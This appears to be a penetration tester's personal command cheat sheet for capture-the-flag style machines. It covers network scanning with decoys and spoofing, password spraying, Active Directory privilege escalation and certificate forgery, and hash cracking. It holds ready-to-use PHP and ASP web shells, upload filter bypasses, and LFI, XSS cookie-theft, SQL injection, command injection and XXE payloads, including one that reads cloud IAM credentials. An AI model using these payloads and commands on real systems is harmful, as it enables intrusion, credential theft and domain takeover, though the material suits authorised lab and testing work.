# Setup
## New Project
PROJECT="$HOME/Projects/$TARGET"; sudo -v; mkdir -p "$PROJECT"; cd "$PROJECT"; echo "PROJECT="$PROJECT"" >> ~/.zshrc; echo "cd $PROJECT" >> ~/.zshrc; touch usernames passwords; echo "\nanonymous\nadministrator\nguest\nkrbtgt\nroot\nbin\nnone" > usernames; echo "\nanonymous" > passwords; tmux list-windows -F '#{window_id}' | xargs -I {} tmux list-panes -t {} -F '#{pane_id}' | while read pane_id; do tmux send-keys -t $pane_id 'source ~/.zshrc' C-m; tmux send-keys -t $pane_id C-l; done;

## Create hosts lists
echo '$TARGET' > hosts
echo '$TARGET' > dc-hosts
echo '$TARGET' > pc-hosts
cat dc-hosts pc-hosts > hosts

## Add domains to hosts file
echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
C:\Windows\System32\drivers\etc\hosts

## Configurations
[*] VMWare
vmware
Edit ➜ Virtual Network Adapter ➜ Change Settings ➜ Add Network ➜ VMnet10
Bridged ➜ Bridged to: Realtek USB GbE Family Controller #2 ➜ Rename Network ➜ Hard Bridged ➜ OK
VM ➜ Settings ➜ Network Adapter ➜ Custom: Hard Bridge

[*] WSL2
%USERPROFILE%\.wslconfig

[wsl2]
networkingMode=bridged
vmSwitch="BridgeEth2"
dnsTunneling=true
dhcp=true
ipv6=false

sudo nano /etc/wsl.conf
[wsl2]
timeSync = false

[network]
generateResolvConf = false
generateHosts = false

[boot]
systemd = true
command = sudo chattr -i /etc/resolv.conf; cat /nameservers > /etc/resolv.conf

[*] DNS
sudo nano /etc/resolv.conf
nameserver 1.1.1.1
nameserver 192.168.1.254

[*] Subnets
ipcalc 10.0.2.4 255.255.255.0

[*] Network Adapters
sudo nmcli con show
sudo nmcli con del $uuid
sudo nmcli con add type ethernet ifname eth0 con-name eth0 autoconnect yes
uuid=e06de7a8-e79d-3cce-8063-fcaba7c7d6d0
sudo nmcli con mod $uuid ipv4.addresses 172.16.1.201/24
sudo nmcli con mod $uuid ipv4.gateway 172.16.1.1
sudo nmcli con mod $uuid +ipv4.dns 1.1.1.1
sudo nmcli con mod $uuid +ipv4.dns 8.8.8.8
sudo nmcli con mod $uuid +ipv4.dns 10.129.123.1
sudo nmcli con mod $uuid +ipv4.dns 10.130.108.1
sudo nmcli con mod $uuid -ipv4.dns 1.2.3.4
sudo nmcli con mod $uuid ipv4.method manual
sudo nmcli con mod $uuid ipv6.method ignore
sudo nmcli con mod $uuid ipv4.route-metric 100
sudo nmcli con mod $uuid ipv4.routes "0.0.0.0/0 10.129.123.1"
sudo nmcli con mod $uuid ipv4.routes "0.0.0.0/0 10.130.108.1"
sudo nmcli con mod $uuid ipv4.routes "0.0.0.0/0 172.28.240.1"
sudo nmcli con up $uuid
sudo nmcli con show $uuid | grep 'ipv4'
sudo systemctl restart NetworkManager.service
sudo systemctl restart networking.service

# Discovery
## External scans
(sudo nmap -n -Pn -sS "$TARGET" -oA 'TCP_1000_$TARGET' --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0 &)
(sudo nmap -n -Pn -sU "$TARGET" -oA 'UDP_1000_$TARGET' --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0 &)
(sudo nmap -n -Pn -sS "$TARGET" -oA 'TCP_ALL_$TARGET' --min-rate 4000 --max-rate 4000 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0 -p- &)
(sudo nmap -n -Pn -sU "$TARGET" -oA 'UDP_ALL_$TARGET' --min-rate 4000 --max-rate 4000 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0 -p- &)
(udpy_proto_scanner.py $TARGET | tee udpy_proto_scanner_$TARGET &)
(enum4linux-ng -A $TARGET | tee enum4linux_$TARGET &)

## Internal scans
nmap -n -sn -PR 10.0.5.0/24
nbtscan-unixwiz 10.0.5.0/24 -m -n -w 0 | sort -k2
netdiscover

# Information Gathering
## Nessus
systemctl status nessusd
systemctl start nessusd
chromium "https://localhost:8834"

## Nmap
(PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sC "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'SCRIPTS_TCP_$TARGET' &)
(PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sV "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VERSIONS_TCP_$TARGET' &)
(PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_TCP_$TARGET' &)
(PORTS=$(cat UDP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sU -sC "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'SCRIPTS_UDP_$TARGET' &)
(PORTS=$(cat UDP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sU -sV "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VERSIONS_UDP_$TARGET' &)
(PORTS=$(cat UDP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sU --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_UDP_$TARGET' &)
(PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sV --script vulners --script-args mincvss=9 "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 | grep -vE '0.0|/cve/|/githubexploit/|/packetstorm/|/cnvd/|/httpd/|/zdt/' | tee 'vulners_$TARGET' &)

## Opening Nmap Scans
cat *TCP*1000*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
cat *UDP*1000*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
cat *TCP*ALL*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
cat *UDP*ALL*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
cat *SCRIPTS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in' | sed 's/Nmap scan/\nNmap scan/g'
cat *VULN*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in|ratelimit' | sed '/Pre-scan/,/vulnerable)\./d' | sed 's/Nmap scan/\nNmap scan/g'
cat *VERSIONS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in|unrecognized|report any|\(\)|SF-|SF:' | sed 's/Nmap scan/\nNmap scan/g'

# Exploitation
## Initial Enumeration
dirsearch -u http://$TARGET --exclude-sizes 12B
ffuf -u https://$DOM/ -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 4242 -t 50 -rate 5000

nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' | grep -Ei 'dns'
nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee usernames
impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache

(
(nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
(nxc smb "$TARGET" -u usernames -p usernames --continue-on-success &)
(nxc ldap "$TARGET" -u usernames -p passwords --continue-on-success &)
(nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success &)
(nxc winrm "$TARGET" -u usernames -p passwords --continue-on-success &)
(nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success &)
) | grep '\[+\] $DOM'
nxc mssql "$TARGET" -u usernames -p passwords; nxc mssql "$TARGET" -u usernames -p usernames


sudo ntpdate -u $TARGET
impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}' > usernames
impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'

## ROOT FLAG
impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['

## Start Bloodhound
.\bloodhound-cli resetpwd
http://127.0.0.1:7474
neo4j:bloodhoundcommunityedition
http://127.0.0.1:8080
admin:RANDOM_PASSWORD

## Create Custom Usernames
username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp

## Sort Files
cat usernames | sort -u | tee usernames
cat passwords | sort -u | tee passwords

## Decompress Files
tar -xzvf backup.tar.gz -C .
unzip backup.zip -d .

## Web
[*] Technologies
whatweb http://$TARGET
wafw00f http://$TARGET

[*] WordPress
wpscan --url http://$TARGET/wordpress --enumerate
Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/

[*] Curl
cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'

[*] Web Shell
+---------- One Liners ----------+
PHP
<?=`$_GET[cmd]`?>
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php echo system($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

ASP
<% Response.ContentType = "text/plain"
Set s = CreateObject("WScript.Shell")
Set c = s.Exec("cmd /c " & Request("cmd"))
Response.Write c.StdOut.ReadAll() %>

+---------- PHP ----------+
<html>
<body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input id="cmd" type="TEXT" name="cmd" autofocus size="80" value="<?php echo isset($_GET['cmd']) ? htmlentities($_GET['cmd']) : ''; ?>" style="outline: none; background: inherit;border: none;font-size: 16px;color: inherit;font-family: inherit;font-weight: 800;">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {system($_GET['cmd'] . ' 2>&1');}
?>
</pre>
<script>
    var cmdElement = document.getElementById('cmd');
    cmdElement.focus();
    cmdElement.setSelectionRange(cmdElement.value.length, cmdElement.value.length);
</script>
</body>
</html>

[*] File Upload
curl --upload-file shell.php http://$TARGET:80/upload/
shell.PhP
shell.phar
shell.P.phpHP
shell%2EPHP
shell%2Ephar%00%2Epng
shell%2Ephar%00.png
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>

[*] Path Traversal
ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 30 -rate 300 -v -mc 200 \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

[*] LFI
/proc/self/environ
/etc/passwd
index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
GET /image?filename=/var/www/images/../../../etc/passwd
GET /image?filename=../../../etc/passwd%00.png

[*] XSS
<img src=x>'"${{7*7}}
<svgonload=alert(document.cookie)>
<svg/onload=alert(document.cookie)>
"onmouseover="alert(document.cookie)
javascript:alert(document.cookie)
?returnPath=javascript:alert(document.cookie)
<iframe src="https://vulnerable.site/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
{{$on.constructor('alert(document.cookie)')()}}
\"-alert(document.cookie)}//
<<<>>><img src="x"/onerror=alert(document.cookie)>
</><TAG/EVENT="">
<iframe src="https://$TARGET/?search=%22%3E%3Cbody%20onresize%3Dalert%28document%2Ecookie%29%3E" onload=this.style.width='0px'>

[*] SQLi
sqlmap -r request --batch --level 3 -dbs
sqlmap -r request --batch --level 3 -D temp_db --tables
sqlmap -r request --batch --level 3 -D temp_db -T users --columns
sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump
' OR 1=1 -- #
OR 1=1 -- #
AND 1=1 -- #
' AND 1=1 -- #
administrator'-- #
' ORDER BY 1 -- #
' UNION SELECT table_name,NULL FROM information_schema.tables -- #
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_efwvmk' -- #
' UNION SELECT username_aakuyh,password_wrukls FROM users_efwvmk -- #
' AND 1=(SELECT 1 FROM users LIMIT 1) -- #
' AND 1=(SELECT 1 FROM users WHERE username='administrator') -- #
' AND 1=(SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)=20) -- #
' AND '$x$'=(SELECT SUBSTR(password,$1$,1) FROM users WHERE username='administrator') -- #
"AND"1"="1
year=2005 ORDER BY 4
username=admin', 'password', true, '2025-02-03 15:14:29.253', 2133415744)-- #&password1=admin&password2=admin	# INSERT INTO sqlinjection004_users (username, password, isAdmin, lastLogin, lastIP)
username=target';-- # &password1=test&password2=test 

[*] Command Injection
;id #
;sleep+10;
;sleep+10;cat+/etc/passwd+>+/var/www/images/test.txt;
;cat /etc/passwd
;echo 'L2V0Yy9wYXNzd2Q=' | base64 -d | xargs cat
;cat "$(echo 'L2V0Yy9wYXNzd2Q=' | base64 -d)"
;ls -la "$(echo 'Li4vLi4vLi4vCg==' | base64 -d)"
;ls -laR "$(echo 'Li4vLi4vLi4vLi4vLi4vCg==' | base64 -d)"
logname=;cat /etc/passwd > log.txt
&amp;id

[*] Content Types
application/x-httpd-php
application/json
application/javascript
application/xml
application/x-www-form-urlencoded
application/pdf
application/zip
application/x-tar
application/x-gzip
multipart/form-data
image/jpeg
image/png
image/gif
text/html
text/plain
text/css

[*] HTTP Methods
GET
HEAD
POST
PUT
DELETE
CONNECT
OPTIONS
TRACE
PATCH

[*] Headers
X-Forwarded-For: 1

[*] XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

productId=<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text" />

Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><x>x</x>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

[*] JWT
git clone https://github.com/wallarm/jwt-secrets.git ~/.git/jwt_secrets

hashcat -a 0 -m 16500 <JWT> ~/.git/jwt_secrets/jwt.secrets.list

[*] GraphQL
Content-Type: application/json

{  "query":"{\n\n__schema\n\n{queryType{name}}"  }

{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

{"query":"{\u000A\n\r\t__schema\u000A\n\r\t{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

/api?query=query+IntrospectionQuery+%7B%0A++%0A%0A%0A%0A%5f%5fschema%0A%0A%0A%0A+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A

nano gql; gqlspection -f gql

https://datafetcher.com/graphql-json-body-converter

{  "query": "query { getUser(id: 3) { id username }}"  }

{  "query": "mutation { deleteOrganizationUser(input: {id:3}) { user { id username } }}"  }

[*] Git
git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git

## Infrastructure
[*] Active Directory
+---------- TGT .ccache ----------+
impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache

+---------- Add ----------+
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'GROUP' 'USER'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'GROUP' 'USER'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'GROUP' 'USER'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add rbcd 'TARGET' 'SERVICE'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dcsync 'TRUSTEE'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'

+---------- Get ----------+
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object MGTSVC$ | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object DC$ | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat

+---------- Search ----------+
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info

+---------- Permissions ----------+
adminCount
AllExtendedRights
description
displayName
distinguishedName
ForceChangePassword
GenericAll
GenericWrite
homeDirectory
logonHours
logonWorkstation
member
memberOf
msDS-AllowedToActOnBehalfOfOtherIdentity
msDS-AllowedToDelegateTo
msDS-GroupMSAMembership
msDS-KeyCredentialLink
msDS-ManagedPassword
msDS-PrimaryComputer
primaryGroupID
profilePath
ResetPassword
sAMAccountName
scriptPath
Self
servicePrincipalName
tokenGroups
unicodePwd
UserAccountControl
ValidatedMSDS-AllowedToActOnBehalfOfOtherIdentity
ValidatedSPN
WriteDacl
WriteOwner

[*] Active Directory: CS
+---------- Request ----------+
certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca '' -template '' -upn 'Administrator' -target $DC -key-size '4096'
certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca '' -template '' -dynamic-endpoint

+---------- Forge ----------+
certutil -store my
certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
certipy-ad forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'

+---------- Authenticate ----------+
certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
change_password administrator 123qweasdF!
impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
evil-winrm -i $TARGET -u administrator -H ''

+---------- Crack ----------+
pfx2john user.pfx
openssl pkcs12 -in user.pfx -nocerts -out auth.key-enc
openssl rsa -in auth.key-enc -out auth.key
openssl pkcs12 -in user.pfx -clcerts -nokeys -out auth.crt
evil-winrm -i $TARGET -S -k auth.key -c auth.crt

[*] Cracking
+---------- PFX ----------+
pfx2john auth.pfx
openssl pkcs12 -in auth.pfx -nocerts -out auth.key-enc
openssl rsa -in auth.key-enc -out auth.key
openssl pkcs12 -in auth.pfx -clcerts -nokeys -out auth.crt
evil-winrm -i $TARGET -S -k auth.key -c auth.crt

+---------- John ----------+
john hashes -w=$rockyou
john hashes --show

+---------- *2john ----------+
/usr/bin/1password2john
/usr/bin/7z2john
/usr/sbin/bitlocker2john
/usr/bin/ccache2john
/usr/bin/cisco2john
/usr/bin/dashlane2john
/usr/bin/diskcryptor2john
/usr/bin/DPAPImk2john
/usr/bin/ecryptfs2john
/usr/bin/enpass2john
/usr/bin/filezilla2john
/usr/sbin/gpg2john
/usr/sbin/hccap2john
/usr/bin/htdigest2john
/usr/bin/kdcdump2john
/usr/sbin/keepass2john
/usr/bin/keychain2john
/usr/bin/keyring2john
/usr/bin/keystore2john
/usr/bin/kirbi2john
/usr/bin/krb2john
/usr/bin/lastpass2john
/usr/bin/libreoffice2john
/usr/bin/luks2john
/usr/bin/mozilla2john
/usr/bin/office2john
/usr/bin/openssl2john
/usr/bin/padlock2john
/usr/bin/pcap2john
/usr/bin/pdf2john
/usr/bin/pem2john
/usr/bin/pfx2john
/usr/sbin/putty2john
/usr/bin/pwsafe2john
/usr/bin/radius2john
/usr/sbin/rar2john
/usr/bin/sap2john
/usr/bin/ssh2john
/usr/bin/telegram2john
/usr/bin/truecrypt2john
/usr/bin/vmx2john
/usr/sbin/zip2john

+---------- Hashcat ----------+
hashcat -h | grep -A 475 "Hash modes" | grep -i 'kerberos'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'ntlm'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'shadow'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'descrypt'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'office'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'bcrypt'

cd \hashcat && hashcat.exe -m 13721 hashes mutated.txt
cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt

0 	MD5
100	SHA1
1400	SHA256
1700	SHA512
500 	md5crypt
1800 	sha512crypt
7400 	sha256crypt
1500 	descrypt
3200 	bcrypt
1000 	NTLM
3000 	LM
5500 	NetNTLMv1
5600 	NetNTLMv2
400     phpass (WordPress, Joomla, phpBB)
18200	Kerberos 5 TGS-REP etype 17
18300	Kerberos 5 TGS-REP etype 18
13100 	Kerberos 5 TGS-REP etype 23
7500 	Kerberos 5 AS-REQ Pre-Auth etype 23
15300 	DPAPI masterkey
15900 	DPAPI domain backupkey
2100	Domain Cached Credentials (DCC)
1100	Domain Cached Credentials 2 (DCC2)
11300	MSSQL 2012+
13200	AxCrypt
13400 	KeePass
12500 	RAR3-hp
13000 	RAR5
13600 	WinZip
17220 	7-Zip
18300 	BitLocker
13711 	VeraCrypt
9400	MS Office 2007
9500	MS Office 2010
9600	MS Office 2013

+---------- Word Count Wordlist ----------+
wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt

+---------- Create Mutated Wordlist ----------+
psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.txt


[*] (21) FTP
+---------- Spray Service ----------+
(hydra -I ftp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- List Files ----------+
nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls

+---------- Download Directory ----------+
wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp

+---------- Upload File ----------+
curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt

+---------- Login to Service ----------+
ftp '$USERNAME'@"$TARGET"
anonymous
ls -a
binary
ascii
get file.txt -

[*] (22) SSH
+---------- Spray Service ----------+
(hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Key Types ----------+
ssh -Q key
ssh-ed25519
ssh-rsa
ssh-dss
ssh-ed25519-cert-v01@openssh.com
ssh-rsa-cert-v01@openssh.com
ssh-dss-cert-v01@openssh.com
ecdsa-sha2-nistp256
ecdsa-sha2-nistp384
ecdsa-sha2-nistp521
ecdsa-sha2-nistp256-cert-v01@openssh.com
ecdsa-sha2-nistp384-cert-v01@openssh.com
ecdsa-sha2-nistp521-cert-v01@openssh.com

+---------- Remove Existing Keys ----------+
ssh-add -D

+---------- Create New Key Pairs ----------+
ssh-keygen -t ed25519 -f id_ed25519 -N ''; chmod 600 id_ed25519 id_ed25519.pub; cat id_ed25519.pub
ssh-keygen -t rsa -f id_rsa -N ''; chmod 600 id_rsa id_rsa.pub; cat id_rsa.pub
ssh-keygen -t dsa -f id_dsa -N ''; chmod 600 id_dsa id_dsa.pub; cat id_dsa.pub

+---------- Add Public Key to Authorized Keys ----------+
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDAS3I0GV78pbzK7Kd3m44tFBbqX1sXRpCv6LPjle3yW root@hostname' > TARGET > ~/.ssh/authorized_keys

+---------- Login to Service ----------+
$USERNAME@$TARGET -i id_ed25519 -oHostKeyAlgorithms=+ssh-ed25519 -oPubkeyAcceptedKeyTypes=+ssh-ed25519
